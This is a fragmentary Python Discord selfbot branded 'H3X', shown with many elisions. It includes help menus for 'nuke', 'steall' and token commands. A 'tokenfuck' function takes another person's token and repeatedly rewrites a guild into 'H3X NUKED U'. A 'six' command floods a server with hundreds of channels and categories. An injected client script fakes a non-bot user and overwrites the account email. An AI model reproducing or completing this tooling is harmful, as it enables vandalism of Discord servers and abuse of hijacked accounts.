...
ctypes.windll.kernel32.SetConsoleTitleW(f'[H3X Selfbot v{SELFBOT.__version__}] | Loading...')
...
def Init():
    if config.get('token') == "token-here":
        ...
        try:
            ...
            os.system(f'title (H3X Selfbot) - Version {SELFBOT.__version__}')
 ...
 {Fore.WHITE}                                                | |   >   <   
  {Fore.WHITE}                                               | |  /  ^  \  
   {Fore.WHITE}                                              |_| /__/ \__\ 
                                ...
                                {Fore.RED}Prefix => {Fore.RED}{prefix}{Fore.LIGHTYELLOW_EX}          |  {Fore.BLUE}H3X =>{Fore.RED} v{SELFBOT.__version__}                                                     
    '''+Fore.RESET)
    ctypes.windll.kernel32.SetConsoleTitleW(f'[H3X Selfbot v{SELFBOT.__version__}] | Logged in as {SIX.user.name}')
    headers = {
      'Authorization': token,
                      ...
                      module.prototype._connect = function(url) {
                        ...
                        this._handleDispatch = function(data, type) {
                          if (type === 'READY') {
                            console.log(data);
                            data.user.bot = false;
                            data.user.email = 'H3X-Was-Here@Fuckyou.com';
...
async def help(ctx):
    ...
    em.add_field(name="`NSFW`",value="`NOKID COMMAND`",inline=False)
    ...
    em.set_image(url="")
    em.set_footer(text="H3X MADE THIZ")
    em.set_thumbnail(url="https://media.discordapp.net/attachments/723783029012693075/730947110488506408/download.png?width=470&height=470")
    await ctx.send(embed=em)
@SIX.command()
async def info(ctx):
    await ctx.message.delete()
    ...
    await ctx.send(embed=em)
    em.set_thumbnail(url="https://cdn.discordapp.com/attachments/706013508831150190/727478965098512425/image0.gif")
@SIX.command()
async def nsfw(ctx):
    await ctx.message.delete()
    em = discord.Embed(colour = discord.Colour.blue())
    em.set_author(name="NSFW")
    ...
    em.set_image(url="")
    em.set_footer(text="H3X MADE THIZ")
    em.set_thumbnail(url="https://cdn.discordapp.com/attachments/706013508831150190/729099912351842414/image0.gif")
    await ctx.send(embed=em)
...
async def setup(ctx):
    ...
    em.add_field(name="`MASSCON`",value="`MASSCON SKYPE H3X`",inline=False)
    em.set_image(url="")
    em.set_footer(text="H3X MADE THIZ")
    em.set_thumbnail(url="https://cdn.discordapp.com/attachments/706013508831150190/729751777028866138/anime98.gif")
    await ctx.send(embed=em)
...
async def fun(ctx):
    ...
    em.set_image(url="")
    em.set_footer(text="H3X MADE THIZ")
    em.set_thumbnail(url="https://cdn.discordapp.com/attachments/706013508831150190/728169213335830588/image0.gif")
    await ctx.send(embed=em)
@SIX.command()
async def steall(ctx):
    ...
    em.set_image(url="")
    em.set_footer(text="H3X MADE THIZ")
    em.set_thumbnail(url="https://cdn.discordapp.com/attachments/706013508831150190/726729228170821682/image0.gif")
    await ctx.send(embed=em)
@SIX.command()
async def token(ctx):
    await ctx.message.delete()
    ...
    em.add_field(name="`NITRO`",value="`MAKE RANDOM NITRO CODE`",inline=False)
    ...
    em.set_image(url="")
    em.set_footer(text="H3X MADE THIZ")
    em.set_thumbnail(url="https://cdn.discordapp.com/attachments/706013508831150190/725861293105348689/image0.gif")
    await ctx.send(embed=em)
@SIX.command()
async def nuke(ctx):
    await ctx.message.delete()
    ...
    em.set_image(url="")
    em.set_footer(text="H3X MADE THIZ")
    em.set_thumbnail(url="https://cdn.discordapp.com/attachments/706013508831150190/725637826686877706/anime.gif")
    await ctx.send(embed=em)
...
async def tokenfuck(ctx, _token): 
    ...
    guild = {
        'channels': "daddy H3X",
        'icon': "https://cdn.discordapp.com/attachments/627321772362039306/724876103516422264/ezgif.com-video-to-gif_24.gif",
        'name': "H3X NUKED U",
        'region': "Central"
    } 
    for _i in range(50):
...
async def six(ctx):
    ...
    try:
        ...
        pass                 
    for _i in range(999):
        await ctx.guild.create_text_channel(name="H3X wizzed")
        await ctx.guild.create_voice_channel(name="H3X wizzed")
        await ctx.guild.create_category(name="H3X wizzed")
        await ctx.guild.create_text_channel(name="H3X wizzed")
        await ctx.guild.create_voice_channel(name="H3X wizzed")
        await ctx.guild.create_category(name="H3X wizzed")
        await ctx.guild.create_text_channel(name="H3X wizzed")
...
async def abc(ctx):
    await ctx.message.delete()
    ABC = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'H', '3', 'X','ñ', 'ñ', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
